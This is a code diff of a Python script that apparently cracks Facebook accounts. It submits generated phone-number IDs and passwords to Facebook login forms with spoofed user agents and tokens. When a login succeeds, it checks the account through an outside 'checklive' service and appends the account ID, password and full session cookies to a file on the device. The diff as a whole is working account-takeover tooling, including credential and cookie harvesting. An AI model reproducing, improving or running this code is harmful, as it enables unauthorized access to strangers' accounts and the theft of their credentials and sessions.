@@ -27,6 +27,7 @@ def ua():
     xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
     return xx
 
+
 def lsb():
     upper = ''.join(random.choices(string.ascii_uppercase, k=6))
     lower = ''.join(random.choices(string.ascii_lowercase, k=4))
@@ -36,6 +37,7 @@ def lsb():
     random.shuffle(password_list)
     return ''.join(password_list)
 
+
 def referer():
     upper = ''.join(random.choices(string.ascii_uppercase, k=6))
     lower = ''.join(random.choices(string.ascii_lowercase, k=6))
@@ -44,6 +46,7 @@ def referer():
     password_list = list(password)
     random.shuffle(password_list)
     return ''.join(password_list)
+
 
 loop = 0
 oks = []
@@ -61,14 +64,21 @@ agent = "Mozilla/5.0 (Linux; Android 12; CPH2095 Build/RKQ1.211119.001) AppleWeb
 
 user = []
 
+
+# ---------lock remove function------------#
+def live_check(uid):
+    chek = requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
+    if chek == "live":
+        return "live"
+
+
 # fb = ""  # mbasic, touch, free, m, x, p
 
 
 def main():
-
     inp = int(input("How many do want to chek? -> "))
     print("Give you number ex: 01850819272")
-    code=input("Put your number -> ")
+    code = input("Put your number -> ")
 
     for i in range(inp):
         # gg=str(random.choice(range(10000000,99999999)))
@@ -120,7 +130,7 @@ def host(uid, pwx, meth, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = ua()
+            uax = agent
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
@@ -157,14 +167,16 @@ def host(uid, pwx, meth, fb):
             session.post(url=url, data=info, headers=had)
             heron_brand = session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
-                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
-                xx = coki.split("c_user=")[1]
-                xd = xx[:15].replace(";", "  ")
-                print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
-                open("/sdcard/shadid.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
-                break
+                if live_check(uid) == "live":
+                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                    xx = coki.split("c_user=")[1]
+                    xd = xx[:15].replace(";", "  ")
+                    print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
+                    open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
+                    break
+                else:pass
             elif "checkpoint" in heron_brand:
-                print(f"\r\r[UNSUCCESSFUL] {xd} <> {ps}\n")
+                pass
 
                 # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
             else:
